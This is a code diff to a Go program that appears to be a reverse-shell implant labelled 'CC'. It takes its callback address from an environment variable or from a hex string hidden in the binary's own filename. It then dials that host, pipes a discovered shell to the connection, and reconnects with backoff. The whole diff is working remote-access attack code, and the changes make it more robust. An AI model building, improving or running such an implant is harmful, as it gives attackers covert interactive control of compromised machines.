@@ -7,6 +7,7 @@ import (
 	"io"
 	"os"
 	"os/exec"
+	"os/signal"
 	"strings"
 	"syscall"
 	"time"
@@ -16,58 +17,71 @@ import (
 )
 
 var (
-	ErrNoRemote = errors.New("R is not configured")
+	ErrNoRemote         = errors.New("R is not configured")
+	ErrNoAddrInFilename = errors.New("binary name does not contain a remote address")
+
+	shellPaths = []string{
+		"/bin/bash",
+		"/usr/bin/bash",
+		"/bin/sh",
+		"/usr/bin/zsh",
+		"/bin/zsh",
+	}
 )
 
 func resolveRemoteFromName(name string) (string, error) {
-	if strings.Contains(name, "-") {
-		fragments := strings.Split(name, "-")
-		addr := fragments[len(fragments)-1]
-
-		if len(addr) != 12 {
-			return "", errors.New("address must be 12 characters long")
-		}
-
-		ipbytes := make([]byte, 4)
-		var port int
-
-		r := bytes.NewBufferString(addr)
-
-		// Simple parse for IP address from hex string
-		_, err := fmt.Fscanf(r, "%02x%02x%02x%02x%04x",
-			&ipbytes[0], &ipbytes[1], &ipbytes[2], &ipbytes[3], &port)
-
-		if err != nil {
-			return "", fmt.Errorf("resolveRemoteFromName: %w", err)
-		}
-
-		// Normalize IPv4 address
-		return fmt.Sprintf("%d.%d.%d.%d:%d",
-			ipbytes[0],
-			ipbytes[1],
-			ipbytes[2],
-			ipbytes[3],
-			port,
-		), nil
+	if !strings.Contains(name, "-") {
+		return "", ErrNoAddrInFilename
 	}
 
-	return "", errors.New("WTF")
+	fragments := strings.Split(name, "-")
+	addr := fragments[len(fragments)-1]
+
+	if len(addr) != 12 {
+		return "", fmt.Errorf("address segment %q must be 12 hex characters", addr)
+	}
+
+	ipbytes := make([]byte, 4)
+	var port int
+
+	r := bytes.NewBufferString(addr)
+
+	_, err := fmt.Fscanf(r, "%02x%02x%02x%02x%04x",
+		&ipbytes[0], &ipbytes[1], &ipbytes[2], &ipbytes[3], &port)
+	if err != nil {
+		return "", fmt.Errorf("resolveRemoteFromName: %w", err)
+	}
+
+	return fmt.Sprintf("%d.%d.%d.%d:%d",
+		ipbytes[0], ipbytes[1], ipbytes[2], ipbytes[3], port,
+	), nil
 }
 
 func findShell() string {
-	// TODO: find shell executable
-	return "/bin/bash"
+	if shell := os.Getenv("SHELL"); shell != "" {
+		if _, err := os.Stat(shell); err == nil {
+			return shell
+		}
+	}
+
+	for _, p := range shellPaths {
+		if _, err := os.Stat(p); err == nil {
+			return p
+		}
+	}
+
+	return "/bin/sh"
 }
 
-func createShell(conn io.ReadWriter) {
+func createShell(conn io.ReadWriteCloser) {
+	defer conn.Close()
+
 	subProcess := exec.Command(findShell())
-	// subProcess.SysProcAttr = &syscall.SysProcAttr{Setsid: true}
 
 	subProcess.Stdin = conn
 	subProcess.Stdout = conn
 	subProcess.Stderr = conn
 
-	// Start the command
 	if err := subProcess.Start(); err != nil {
 		fmt.Println("Failed to start command:", err)
 		return
@@ -82,9 +96,11 @@ func createShell(conn io.ReadWriter) {
 func resolveRemote() error {
 	if config.Remote == "" {
 		config.Remote = os.Getenv("R")
+	}
 
-		if config.Remote == "" {
-			resolveRemoteFromName(os.Args[0])
+	if config.Remote == "" {
+		if addr, err := resolveRemoteFromName(os.Args[0]); err == nil {
+			config.Remote = addr
 		}
 	}
 
@@ -97,23 +113,19 @@ func resolveRemote() error {
 	return nil
 }
 
-// Entry point
-func main() {
-	config.Info("Starting CC")
-
-	// Resolving remote address
-	if err := resolveRemote(); err != nil {
-		fmt.Println("error: ", err.Error())
-
-		return
-	}
-
+func runSession() {
 	retry := 0
 
 	for {
-		time.Sleep(time.Second * time.Duration(retry*retry))
+		sleepSec := retry * retry
+		if sleepSec > 60 {
+			sleepSec = 60
+		}
+		if retry > 0 {
+			config.Info("Reconnecting in %ds (attempt %d)", sleepSec, retry)
+		}
+		time.Sleep(time.Second * time.Duration(sleepSec))
 
-		// Initiate connection to the remote
 		conn, err := connection.Connect(config.Remote)
 		if err != nil {
 			if errors.Is(err, syscall.ECONNREFUSED) {
@@ -126,7 +138,27 @@ func main() {
 		}
 
 		retry = 0
-		defer conn.Close()
 		createShell(conn)
 	}
+}
+
+// Entry point
+func main() {
+	config.Info("Starting CC")
+
+	if err := resolveRemote(); err != nil {
+		fmt.Println("error: ", err.Error())
+		return
+	}
+
+	sigCh := make(chan os.Signal, 1)
+	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
+
+	go func() {
+		sig := <-sigCh
+		config.Info("Received %v, shutting down", sig)
+		os.Exit(0)
+	}()
+
+	runSession()
 }
